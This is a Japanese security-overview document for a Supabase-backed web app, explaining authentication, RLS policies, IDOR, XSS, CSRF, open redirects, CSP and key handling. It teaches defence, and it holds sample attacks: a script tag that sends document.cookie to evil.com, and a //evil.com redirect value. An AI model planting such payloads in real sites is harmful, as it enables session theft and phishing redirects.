# 00. 全体像と用語

## 1. なぜ「セキュリティ全部やってない」ように見えたか

Megliminal は **Supabase にかなり委譲** している。

| よくある自前実装 | メグリミナルでは |
|---|---|
| bcrypt でパスワード保存 | Supabase Auth が担当 |
| `/api/posts` を Express で書く | ブラウザ → Supabase REST 直叩き |
| SQL を文字列連結 | Supabase JS がパラメータ化 |
| セッションを Redis で管理 | Supabase SSR Cookie + JWT |

だから「セキュリティ用のファイルが少ない」ように見えるが、**RLS・Auth・Zod・middleware** に分散している。

## 2. 用語集（中級者向け）

### 認証 vs 認可

| 用語 | 英語 | 質問 | 例 |
|---|---|---|---|
| **認証** | Authentication | あなたは誰？ | メール/Google ログイン |
| **認可** | Authorization | 何ができる？ | 自分の投稿だけ編集、admin だけ `/admin` |

ログインできても、他人の投稿は編集できない → 認可の話。

### RLS (Row Level Security)

PostgreSQL の機能。**行単位**で SELECT/INSERT/UPDATE/DELETE を制限。

```sql
-- 例: posts は本人だけ更新
create policy "posts_update_own" on public.posts
  for update
  using (auth.uid() = user_id)
  with check (auth.uid() = user_id);
```

- `using` … 既存行を触れる条件
- `with check` … 更新後の行が満たすべき条件
- `auth.uid()` … Supabase Auth の JWT から取ったユーザー ID

**ポイント:** ブラウザから anon key で REST API を叩いても、RLS を通らない操作は DB が拒否する。

### IDOR / BOLA

| 用語 | 意味 |
|---|---|
| **IDOR** | Insecure Direct Object Reference。URL や JSON の `post_id` を他人の ID に差し替える攻撃 |
| **BOLA** | Broken Object Level Authorization。オブジェクト単位の権限チェック漏れ（IDOR の現代的呼び方） |

例: DevTools で `deletePost('他人のUUID')` を呼ぶ。

### XSS

Cross-Site Scripting。ユーザー入力が HTML/JS として実行される攻撃。

```html
<!-- 攻撃例: タイトルに入れられた場合 -->
<script>fetch('https://evil.com?c='+document.cookie)</script>
```

React の `{post.title}` は通常エスケープされるが、`dangerouslySetInnerHTML` や `javascript:` URL は別問題。

### CSRF

Cross-Site Request Forgery。ログイン中ユーザーの Cookie を悪用し、**知らないうちに操作**させる。

典型: `<form action="https://bank.com/transfer" method="POST">` を別サイトに埋める。

Megliminal では書き込みが **Supabase Bearer トークン** 主体なので、昔ながらの「Cookie だけのフォーム POST」CSRF リスクは低い。ただし **Cookie 認証の独自 API**（退会 API）には注意。

### Open Redirect

ログイン後の `?redirect=` 等で **外部サイトへ飛ばす** 攻撃。

```
/login?redirect=//evil.com   ← / で始まるが外部ドメイン
```

### CSP (Content-Security-Policy)

ブラウザに「どこから script/style/img を読んでいいか」を指示する HTTP ヘッダー。

### Defense in Depth（多層防御）

1 箇所（例: UI でボタン非表示）だけに頼らず、**複数層**で守る。

```
UI で編集ボタン非表示  ← すり抜け可能（DevTools）
  ↓
repository で所有者チェック  ← すり抜け可能（直接 API）
  ↓
RLS  ← ここで必ず止まる
```

## 4. anon key と service_role key

| キー | 置き場所 | 権限 |
|---|---|---|
| **anon key** | `NEXT_PUBLIC_SUPABASE_ANON_KEY`（ブラウザ OK） | RLS の範囲内のみ |
| **service_role key** | サーバー専用 env | **RLS をバイパス** |

`lib/supabase/env.ts` は anon key の JWT payload を decode して `role === 'service_role'` なら起動時に throw する。

**絶対にやってはいけないこと:**

```env
# これを NEXT_PUBLIC_ に入れると全データが漏洩・改ざん可能
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJ...service_role...
```
